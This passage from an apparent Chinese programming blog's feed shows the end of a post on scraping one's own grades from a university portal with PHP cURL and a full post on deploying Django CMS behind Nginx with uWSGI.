class="line">$viewstate=login_post($url2,$cookie,&apos;&apos;);</div><div class="line">preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $viewstate, $vs);</div><div class="line">$state=$vs[1][0];  //$state存放一会post的__VIEWSTATE</div><div class="line">$post=array(</div><div class="line">   &apos;__EVENTTARGET&apos;=&gt;&apos;&apos;,</div><div class="line">   &apos;__EVENTARGUMENT&apos;=&gt;&apos;&apos;,</div><div class="line">   &apos;__VIEWSTATE&apos;=&gt;$state,</div><div class="line">  &apos;hidLanguage&apos;=&gt;&apos;&apos;,</div><div class="line">&apos;ddlXN&apos;=&gt;&apos;2016-2017&apos;,//若改为2015-2016则为2015-2016年度成绩</div><div class="line">&apos;ddlXQ&apos;=&gt;&apos;2&apos;,//若改为1则为第一学期成绩</div><div class="line">&apos;ddl_kcxz&apos;=&gt;&apos;&apos;,</div><div class="line">&apos;btn_xq&apos;=&gt;&apos;%D1%A7%C6%DA%B3%C9%BC%A8&apos;</div><div class="line">);</div><div class="line">   $grades=login_post($url2,$cookie,http_build_query($post));</div><div class="line">   echo $grades;//输出成绩页面</div></pre></td></tr></table></figure>
<p><img src="http://op72m4y17.bkt.clouddn.com/19p.png" alt="成功获取成绩"></p>
<h3 id="对上述数据的一个简单解释"><a href="#对上述数据的一个简单解释" class="headerlink" title="对上述数据的一个简单解释"></a>对上述数据的一个简单解释</h3><ul>
<li><p>首先是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">   preg_match_all(&apos;/&lt;span id=&quot;xhxm&quot;&gt;([^&lt;&gt;]+)&lt;\/span&gt;/&apos;, $con2, $xm);</div><div class="line">$xm[1][0]=substr($xm[1][0],0,-4);  //字符串截取，获得姓名</div></pre></td></tr></table></figure>
</li>
<li><p>有图有真相，截取姓名<br><img src="http://op72m4y17.bkt.clouddn.com/17p.png" alt="初始登录界面的截取"></p>
</li>
<li>还有另外一个选择，在成绩所在页面截取也ok<br><img src="http://op72m4y17.bkt.clouddn.com/18p.png" alt="成绩界面的截取"><h2 id="最后附上非常简短的全部代码-输出全部成绩"><a href="#最后附上非常简短的全部代码-输出全部成绩" class="headerlink" title="最后附上非常简短的全部代码(输出全部成绩)"></a>最后附上非常简短的全部代码(输出全部成绩)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    ini_set(&apos;max_execution_time&apos;, 3000);</div><div class="line">    session_start();</div><div class="line">    $id=session_id();</div><div class="line">    $_SESSION[&apos;id&apos;]=$id;</div><div class="line">    $cookie = tempnam(&apos;./cookie&apos;, &apos;cookie&apos;); //用一个随机的不重复的文件名保存cookie,$cookie即为cookie文件名  </div><div class="line">    $verify_code_url = &quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/CheckCode.aspx&quot;; //验证码地址</div><div class="line">    $curl = curl_init();//初始化一个curl</div><div class="line">    curl_setopt($curl, CURLOPT_URL, $verify_code_url);//设置URL</div><div class="line">    curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie);  //保存cookie</div><div class="line">    curl_setopt($curl, CURLOPT_HEADER, 0);//设置浏览器头</div><div class="line">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);//设置返回方式，不自动输出，只能通过echo输出</div><div class="line">    $img = curl_exec($curl);  //执行curl，获得验证码图片</div><div class="line">    curl_close($curl);//关闭curl</div><div class="line">    $fp = fopen(&quot;verifyCode.jpg&quot;,&quot;w&quot;);  //打开一个jpg格式文件保存验证码</div><div class="line">    fwrite($fp,$img);   </div><div class="line">    fclose($fp);</div><div class="line">    header(&quot;Content-type: text/html; charset=gb2312&quot;); </div><div class="line">    //设置charset,这个在原网页html头部可以看到,避免输出编码错误 </div><div class="line">    sleep(10);//给你10s输入验证码</div><div class="line">    $_POST[&apos;code&apos;]= file_get_contents(&apos;code.txt&apos;);</div><div class="line">    $_POST[&apos;xh&apos;]=&apos;你的学号&apos;;</div><div class="line">    $_POST[&apos;pw&apos;]=&apos;你的密码&apos;;</div><div class="line">    $_SESSION[&apos;xh&apos;]=$_POST[&apos;xh&apos;];</div><div class="line">    $xh=$_POST[&apos;xh&apos;];</div><div class="line">    $pw=$_POST[&apos;pw&apos;];</div><div class="line">    $code= $_POST[&apos;code&apos;];</div><div class="line">    $url=&quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/default2.aspx&quot;;  //教务处地址</div><div class="line">    $con1=login_post($url,$cookie,&apos;&apos;);</div><div class="line">    preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $con1, $view); //获取__VIEWSTATE字段并存到$view数组中</div><div class="line">    $post=array(</div><div class="line">        &apos;__VIEWSTATE&apos;=&gt;$view[1][0],</div><div class="line">        &apos;txtUserName&apos;=&gt;$xh,</div><div class="line">        &apos;TextBox2&apos;=&gt;$pw,</div><div class="line">        &apos;txtSecretCode&apos;=&gt;$code,</div><div class="line">        &apos;RadioButtonList1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;学生&apos;),</div><div class="line">        &apos;Button1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;登录&apos;),</div><div class="line">        &apos;lbLanguage&apos;=&gt;&apos;&apos;,</div><div class="line">        &apos;hidPdrs&apos;=&gt;&apos;&apos;,</div><div class="line">        &apos;hidsc&apos;=&gt;&apos;&apos;</div><div class="line">    );</div><div class="line">    $con2=login_post($url,$cookie,http_build_query($post));</div><div class="line">    //echo $con2;</div><div class="line">//自定义一个发起curl链接的函数，传入url,cookie和post数据</div><div class="line">    function login_post($url,$cookie,$post)&#123;</div><div class="line">        $ch = curl_init();</div><div class="line">        curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">        curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</div><div class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //重要，抓取跳转后数据</div><div class="line">        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); </div><div class="line">        curl_setopt($ch, CURLOPT_REFERER, &apos;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/default2.aspx&apos;);  //重要，302跳转需要referer，可以在Request Headers找到 </div><div class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS,$post);  //post提交数据</div><div class="line">        $result=curl_exec($ch);</div><div class="line">        curl_close($ch);</div><div class="line">        return $result;</div><div class="line">    &#125;</div><div class="line">	preg_match_all(&apos;/&lt;span id=&quot;xhxm&quot;&gt;([^&lt;&gt;]+)&lt;\/span&gt;/&apos;, $con2, $xm);</div><div class="line">	$xm[1][0]=substr($xm[1][0],0,-4);  //字符串截取，获得姓名</div><div class="line">	$url2=&quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/xf_xsqxxxk.aspx?xh=&quot;.$xh.&quot;&amp;xm=&quot;.$xm[1][0];</div><div class="line">	$viewstate=login_post($url2,$cookie,&apos;&apos;);</div><div class="line">	preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $viewstate, $vs);</div><div class="line">	$state=$vs[1][0];  //$state存放一会post的__VIEWSTATE</div><div class="line">	$post=array(</div><div class="line">	   &apos;__EVENTTARGET&apos;=&gt;&apos;&apos;,</div><div class="line">	   &apos;__EVENTARGUMENT&apos;=&gt;&apos;&apos;,</div><div class="line">	   &apos;__VIEWSTATE&apos;=&gt;$state,</div><div class="line">	  &apos;hidLanguage&apos;=&gt;&apos;&apos;,</div><div class="line">	&apos;ddlXN&apos;=&gt;&apos;2016-2017&apos;,//若改为2015-2016则为2015-2016年度成绩</div><div class="line">	&apos;ddlXQ&apos;=&gt;&apos;2&apos;,//若改为1则为第一学期成绩</div><div class="line">	&apos;ddl_kcxz&apos;=&gt;&apos;&apos;,</div><div class="line">	&apos;btn_xq&apos;=&gt;&apos;%D1%A7%C6%DA%B3%C9%BC%A8&apos;</div><div class="line">	);</div><div class="line">    $grades=login_post($url2,$cookie,http_build_query($post));</div><div class="line">    echo $grades;//输出成绩页面</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="爬取所有成绩"><a href="#爬取所有成绩" class="headerlink" title="爬取所有成绩"></a>爬取所有成绩</h3><blockquote>
<p>需要改动的post数据有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&apos;ddlXN&apos;=&gt;&apos;&apos;,</div><div class="line">&apos;ddlXQ&apos;=&gt;&apos;&apos;,</div><div class="line">&apos;ddl_kcxz&apos;=&gt;&apos;&apos;,</div><div class="line">&apos;btn_zcj&apos;=&gt;&apos;%C0%FA%C4%EA%B3%C9%BC%A8&apos;</div><div class="line">//而且url要改成获取总成绩的链接(请在network里面搜寻)</div><div class="line">$url2=http://xsweb.scuteo.com/(05b2142ecws0cfacyw3agr45)/xscjcx.aspx?xh=&quot;.$xh.&quot;&amp;xm=&quot;.$xm[1][0];</div></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/20p.png" alt="所有成绩的输出"></p>
<h3 id="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正，下一篇博文将会讲解如何实现自动抢课功能，而在下下篇博文会介绍图形化展示爬取综测智育成绩的网页制作。"><a href="#各位小伙伴有任何问题可以在下方留言，我会及时解答或订正，下一篇博文将会讲解如何实现自动抢课功能，而在下下篇博文会介绍图形化展示爬取综测智育成绩的网页制作。" class="headerlink" title="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正，下一篇博文将会讲解如何实现自动抢课功能，而在下下篇博文会介绍图形化展示爬取综测智育成绩的网页制作。"></a>各位小伙伴有任何问题可以在下方留言，我会及时解答或订正，下一篇博文将会讲解如何实现自动抢课功能，而在下下篇博文会介绍图形化展示爬取综测智育成绩的网页制作。</h3><p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 作者：Hac </category>
            
            <category> 教务系统数据爬取 </category>
            
            <category> php学习/实战笔记 </category>
            
            <category> 代码模拟登录/按键 </category>
            
            <category> php_curl快速开发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php应用脚本 </tag>
            
            <tag> 网络爬虫 </tag>
            
            <tag> 谷歌抓包分析隐藏数据 </tag>
            
            <tag> cookie验证 </tag>
            
            <tag> 自动化脚本 </tag>
            
            <tag> php_curl </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[利用uWSGI稳健地将Django(CMS)部署到Nginx上]]></title>
      <url>http://yikunhaocong.com/2017/09/06/djangocms-uwsgi/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    CentOS服务器配置Djangocms应用，刚开始在windows下用Apache+mod_wsgi.so配置属实是坑多到令人发指，python-web应用建议在linux下用uwsgi+Nginx配置(windows不支持uwsgi),进一步实现负载均衡。<br>    本博文只针对自己搭建+部署的djangocms应用进行解析<br><a id="more"></a><p></p>
<h2 id="Apache-mod-wsgi-so配置django应用"><a href="#Apache-mod-wsgi-so配置django应用" class="headerlink" title="Apache+mod_wsgi.so配置django应用"></a>Apache+mod_wsgi.so配置django应用</h2><ul>
<li><p>给各位想要这样配置的小伙伴提供一些友情资源：</p>
<blockquote>
<p>下面是适应windows下Apache和python各版本的mod_wsgi.so模块压缩包：<br><a href="http://pan.baidu.com/s/1i4AwRiP" target="_blank" rel="external">链接: http://pan.baidu.com/s/1i4AwRiP 密码：osqw</a><br><img src="http://op72m4y17.bkt.clouddn.com/x1.png" alt="适应不同版本的mod_wsgi.so"><br><a href="http://pan.baidu.com/s/1bplMONl" target="_blank" rel="external">链接：http://pan.baidu.com/s/1bplMONl 密码：57l8</a><br><img src="http://op72m4y17.bkt.clouddn.com/x2.png" alt="适应不同编译版本的mod_wsgi.so"></p>
</blockquote>
</li>
<li><p>具体部署到服务器的教程可以参照这篇<br><a href="http://agong.org/2013/windows64-python3-apache-wsgi-django.html" target="_blank" rel="external">windows64位下python3配合apache与wsgi部署django项目</a><br>本篇博文主要讲Nginx+uwsgi的配置，接下来进入正题</p>
<h2 id="uwsgi-Nginx部署的原理"><a href="#uwsgi-Nginx部署的原理" class="headerlink" title="uwsgi+Nginx部署的原理"></a>uwsgi+Nginx部署的原理</h2><h3 id="Nginx-uWSGI-APP官方简介"><a href="#Nginx-uWSGI-APP官方简介" class="headerlink" title="Nginx+uWSGI+APP官方简介"></a>Nginx+uWSGI+APP官方简介</h3><blockquote>
<p>APP（应用程序），就是开发者写的应用程序，例如django，bottle这些。记录怎么处理客户端发来的请求的逻辑部分。<br>WSGI，是一个协议，Python用于Web开发的协议<br>uWSGI，是一个程序，充当Web服务器或中间件。<br>如果架构是Nginx+uWSGI+APP，uWSGI是一个中间件<br>如果架构是uWSGI+APP，uWSGI是一个服务器<br>uwsgi，是uWSGI程序实现的一个自有的协议。<br>Web协议出现顺序：<br>CGI -&gt; FCGI -&gt; WSGI -&gt; uwsgi<br>CGI，最早的协议<br>FCGI，比CGI快<br>WSGI，全称 Web Server Gateway Interface。是Python专用的协议，其他语言没有。用于处理Web服务器和应用程序（APP）的交互信息。很多Web框架（如：django）都会自带WSGI服务器，但是性能不好，只作测试用途。工作原理如下：<br><img src="http://7xpt1q.com1.z0.glb.clouddn.com/img%2Fdoc%2FWSGI%E5%8E%9F%E7%90%86.png" alt="WSGI"><br>uwsgi，比FCGI和WSGI都快，是uWSGI项目自有的协议，主要特征是采用二进制来存储数据，之前的协议都是使用字符串，所以在存储空间和解析速度上，都优于字符串型协议<br>附上一张性能对比图：<br><img src="http://lazynight.me/wp-content/uploads/2012/09/uwsgi.jpg" alt="uwsgi性能最优"><br>上面说的都是协议，而作为反向代理服务器(软件)的Nginx，它的工作原理如下：<br><img src="http://7xpt1q.com1.z0.glb.clouddn.com/img%2Fdoc%2F%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86.png" alt="Nginx工作原理"><br>什么是反向代理？<br>正向代理，例如FQ用的代理服务器就是正向代理，浏览器主动请求代理服务器，代理服务器转发请求到对应的目标服务器<br>反向代理，部署在Web服务器上，代理所有外部网络对内部网络的访问。浏览器访问服务器，必须经过这个代理，是被动的。<br>正向代理的主动方是客户端，反向代理的主动方是Web服务器。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">反向代理的作用：</div><div class="line">1.安全，客户端对Web服务器的访问需要先经过反向代理服务器。这样可以防止外部程序对Web服务器的直接攻击。</div><div class="line">2.负载均衡，反向代理服务器可以根据Web服务器的负载情况，动态地把HTTP请求交给不同的Web服务器来处理，前提是要有多个Web服务器。</div><div class="line">3.提升Web服务器的IO性能。一个HTTP请求的数据，从客户端传输给服务器，是需要时间的，例如N秒，如果直接传给Web服务器，Web服务器就需要让一个进程阻塞N秒，来接收IO，这样会降低Web服务器的性能。如果使用反向代理服务器，先让反向代理服务器接收完整个HTTP请求，再把请求发给Web服务器，就能提升Web服务器的性能。还有一些静态文件的请求，可以直接交给反向代理来处理，不需要经过Web服务器。</div><div class="line">Nginx是一个高性能的HTTP和反向代理服务器。</div></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>Nginx+uWSGI+应用程序的架构：<br><img src="http://7xpt1q.com1.z0.glb.clouddn.com/img%2Fdoc%2FNginx%2BuWSGI%E5%8E%9F%E7%90%86.png" alt="Nginx+uWSGI+应用程序"></p>
<h2 id="安装好Nginx和uwsgi"><a href="#安装好Nginx和uwsgi" class="headerlink" title="安装好Nginx和uwsgi"></a>安装好Nginx和uwsgi</h2><blockquote>
<p>Linux环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$sudo apt-get install python-dev</div><div class="line">$sudo apt-get install python-pip</div><div class="line">$sudo pip install pip --upgrade</div><div class="line">$sudo apt-get install libpcre3 libpcre3-dev</div><div class="line">$sudo apt-get install zlib1g-dev</div><div class="line">$sudo apt-get install nginx-full</div></pre></td></tr></table></figure></p>
<p>CentOS环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">yum install pcre</div><div class="line">yum install libxml2</div><div class="line">yum install python-devel</div><div class="line">//安装uwsgi需要libxml2和python-devel</div><div class="line">//然后uWSGI可以从官网wget最新版本再解压，此处采用pip安装</div><div class="line">pip install uwsgi</div><div class="line">//Nginx编译需要pcre和openssl的支持，先下载安装：</div><div class="line">yum install pcre-devel openssl openssl-devel</div><div class="line">wget http://download.nginx.org/nginx-1.3.6.tar.gz</div><div class="line">//可以下载更新版，此处将以1.3.6作为示例</div><div class="line">cd nginx-1.3.6</div><div class="line">./configure</div><div class="line">make</div><div class="line">make install</div><div class="line">//至此安装完成</div></pre></td></tr></table></figure></p>
</blockquote>
<h2 id="接下来分三步完成django项目的部署"><a href="#接下来分三步完成django项目的部署" class="headerlink" title="接下来分三步完成django项目的部署"></a>接下来分三步完成django项目的部署</h2><h3 id="1-在工程项目下新建一个Nginx配置文件-此处命名为mysite-conf"><a href="#1-在工程项目下新建一个Nginx配置文件-此处命名为mysite-conf" class="headerlink" title="1.在工程项目下新建一个Nginx配置文件(此处命名为mysite.conf)"></a>1.在工程项目下新建一个Nginx配置文件(此处命名为mysite.conf)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line"># 监听的端口</div><div class="line">listen      8000;</div><div class="line">server_name localhost; # 如果是服务器的话，换上IP地址</div><div class="line">charset     utf-8;</div><div class="line">access_log /haocong/s_sites/access_log; #输出访问记录</div><div class="line">error_log  /haocong/s_sites/error_log; # 将/haocong/s_sites换成你项目所在地址</div><div class="line"># max upload size</div><div class="line">client_max_body_size 75M; </div><div class="line">location /static &#123;</div><div class="line">alias  /haocong/s_sites/static; # 将/haocong/s_sites换成你项目所在地址</div><div class="line">&#125;</div><div class="line"># Finally, send all non-media requests to the Django server.</div><div class="line">location / &#123;</div><div class="line">    uwsgi_pass 127.0.0.1:3400; //用于与uWSGI的socket通信</div><div class="line">    include    /etc/nginx/uwsgi_params; # 包含uwsgi_params(uwsgi参数设置)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<blockquote>
<p>这个是Nginx的配置文件，除了常见的目录和参数设置之外，还包含了一个与uWSGI相关的参数uwsgi_pass，而且后面接的是一个端口，Nginx和uWSGI是如何合作的？<br>先用几张图说明一下它们各自的工作流程：</p>
</blockquote>
<ul>
<li>nginx+uwsgi+django部署原理图<br><img src="http://img.blog.csdn.net/20170315104337260?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZW53ZWl0ZWNo/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="nginx+uwsgi+django部署原理图"></li>
</ul>
<h3 id="2-通过软连接将配置文件转移到Nginx所属的目录下"><a href="#2-通过软连接将配置文件转移到Nginx所属的目录下" class="headerlink" title="2.通过软连接将配置文件转移到Nginx所属的目录下"></a>2.通过软连接将配置文件转移到Nginx所属的目录下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$sudo ln -s /haocong/s_sites/mysite.conf /etc/nginx/conf.d/mysite.conf</div><div class="line">#注意要将/haocong/s_sites改为自己项目所在地址</div><div class="line">#重启nginx</div><div class="line">$sudo service nginx restart</div></pre></td></tr></table></figure>
<blockquote>
<p>为什么是放在conf.d目录下而不是直接修改nignx/nginx.conf呢？<br>这是因为nginx.conf里有一句include /etc/nginx/conf.d/*.conf,就是Nginx主配置会自动加载conf.d里的所有配置文件，不修改主文件nginx.conf可以实现一定程度的低耦合，防止配置混乱。</p>
</blockquote>
<h3 id="3-在项目目录下新建ok-ini文件配置uwsgi"><a href="#3-在项目目录下新建ok-ini文件配置uwsgi" class="headerlink" title="3.在项目目录下新建ok.ini文件配置uwsgi"></a>3.在项目目录下新建ok.ini文件配置uwsgi</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[uwsgi]</div><div class="line">socket = 127.0.0.1:3400</div><div class="line"># chdir修改为你的django项目地址</div><div class="line">chdir           = /haocong/s_sites</div><div class="line"># module修改为你的django中wsgi.py相对于chdir的地址,&apos;.&apos;代表下一层目录</div><div class="line">module          = s_sites.wsgi</div><div class="line"># 例如我的wsgi.py是放在/haocong/s_sites/s_sites/wsgi.py</div><div class="line"># 主进程设置</div><div class="line">master          = true</div><div class="line"># 最大进程设置</div><div class="line">processes       = 2</div><div class="line">threads = 2</div><div class="line">max-requests = 6000</div><div class="line"># 权限设置，可能需要</div><div class="line">chmod-socket    = 664</div><div class="line"># 在结束时清理环境</div><div class="line">vacuum          = true</div></pre></td></tr></table></figure>
<blockquote>
<p>启动uwsgi，键入uwsgi –ini /所放位置/ok.ini </p>
<ul>
<li>如果看到如下输出，表明运行正常：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"> [uWSGI] getting INI configuration from hello_uwsgi.ini</div><div class="line">*** .........</div><div class="line">machine: x86_64</div><div class="line">clock source: unix</div><div class="line">pcre jit disabled</div><div class="line">detected number of CPU cores: 2</div><div class="line">current working directory: .....</div><div class="line">detected binary path: /usr/local/bin/uwsgi</div><div class="line">uWSGI running as root, you can use --uid/--gid/--chroot options</div><div class="line">*** WARNING: you are running uWSGI as root !!! (use the --uid flag) ***</div><div class="line">chdir() to /......</div><div class="line">your processes number limit is 175957</div><div class="line">your memory page size is 4096 bytes</div><div class="line">detected max file descriptor number: 4096</div><div class="line">lock engine: pthread robust mutexes</div><div class="line">thunder lock: disabled (you can enable it with --thunder-lock)</div><div class="line">uwsgi socket 0 bound to TCP address 127.0.0.1:3400 fd 3</div><div class="line">Python version: 2.7.6 (default, ......)  [GCC 4.8.2]</div><div class="line">*** Python threads support is disabled. You can enable it with --enable-threads ***</div><div class="line">Python main interpreter initialized at 0x1dc6ef0</div><div class="line">your server socket listen backlog is limited to 100 connections</div><div class="line">your mercy for graceful operations on workers is 60 seconds</div><div class="line">mapped 218280 bytes (213 KB) for 2 cores</div><div class="line">*** Operational MODE: preforking ***</div><div class="line">WSGI app 0 (mountpoint=&apos;&apos;) ready in 1 seconds on interpreter 0x1dc6ef0 pid: 21844 (default app)</div><div class="line">*** uWSGI is running in multiple interpreter mode ***</div><div class="line">spawned uWSGI master process (pid: 21844)</div><div class="line">spawned uWSGI worker 1 (pid: 21845, cores: 1)</div><div class="line">spawned uWSGI worker 2 (pid: 21846, cores: 1)</div></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<p>如何设置uwsgi后台运行？在ok.ini配置文件中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">daemonize = /haocong/s_sites/uwsgi.log # /haocong/s_sites改为你的项目目录</div><div class="line"># 这样就会把wsgi后台运行的日志打印到uwsgi.log中</div></pre></td></tr></table></figure></p>
<h2 id="设置完毕，在浏览器输入你设置的服务器IP-端口即可访问-输入http-xxx-xxx-xxx-xxx-8000访问你的django应用"><a href="#设置完毕，在浏览器输入你设置的服务器IP-端口即可访问-输入http-xxx-xxx-xxx-xxx-8000访问你的django应用" class="headerlink" title="设置完毕，在浏览器输入你设置的服务器IP+端口即可访问,输入http://xxx.xxx.xxx.xxx:8000访问你的django应用"></a>设置完毕，在浏览器输入你设置的服务器IP+端口即可访问,输入<a href="http://xxx.xxx.xxx.xxx:8000访问你的django应用" target="_blank" rel="external">http://xxx.xxx.xxx.xxx:8000访问你的django应用</a></h2><blockquote>
<p>解释：在nginx设置文件中一共出现了两个端口，一个是8000，用于对客户端的监听，一个是3400，用于与uWSGI进行socket通信，也就是说当用户访问8000端口时，nginx服务器软件会将对应动态网页请求通过3400转发给uWSGI，然后获取相应资源再反馈给客户端，但是对于一般的静态资源访问，nginx可以自行处理(所以需要在配置文件里设置静态文件目录)而不需要转发给uWSGI。</p>
</blockquote>
<h2 id="上述配置是笔者自己整理-编写，测试通过，若配置失败，可以参考如下教程："><a href="#上述配置是笔者自己整理-编写，测试通过，若配置失败，可以参考如下教程：" class="headerlink" title="上述配置是笔者自己整理+编写，测试通过，若配置失败，可以参考如下教程："></a>上述配置是笔者自己整理+编写，测试通过，若配置失败，可以参考如下教程：</h2><p>(网上很多教程都是不全的，这里只提供比较可信的教程)</p>
<blockquote>
<p><a href="https://uwsgi-docs-zh.readthedocs.io/zh_CN/latest/WSGIquickstart.html" target="_blank" rel="external">官方uWSGI配置教程以及更多优化特性</a><br><a href="http://www.jianshu.com/p/f83f8cca9a0a" target="_blank" rel="external">nginx+centos+uwsgi部署django过程全记录</a><br><a href="https://my.oschina.net/junn/blog/147923" target="_blank" rel="external">nginx问题解决：502 bad gateway</a><br>个人推荐有什么问题直接谷歌overflow，上面的回答一般比较全面</p>
</blockquote>
<h3 id="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正"><a href="#各位小伙伴有任何问题可以在下方留言，我会及时解答或订正" class="headerlink" title="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正"></a>各位小伙伴有任何问题可以在下方留言，我会及时解答或订正</h3><p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 作者：Hac </category>
            
            <category> Python网络应用 </category>
            
            <category> Django实战笔记 </category>
            
            <category> DjangoCMS应用部署 </category>
            
            <category> uWSGI与Nginx的配置 </category>
            
            <category> (附)Apache+mod_wsgi.so </category>
            
        </categories>
        
        
        <tags>
            
            <tag> uWSGI与Nginx的通信 </tag>
            
            <tag> Nginx的socket转发 </tag>
            
            <tag> 二进制uwsgi协议 </tag>
            
            <tag> 反向代理服务器 </tag>
            
            <tag> 负载均衡 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[多级页表虚拟内存管理器C++、python和node.js的实现]]></title>
      <url>http://yikunhaocong.com/2017/08/17/p-table/</url>
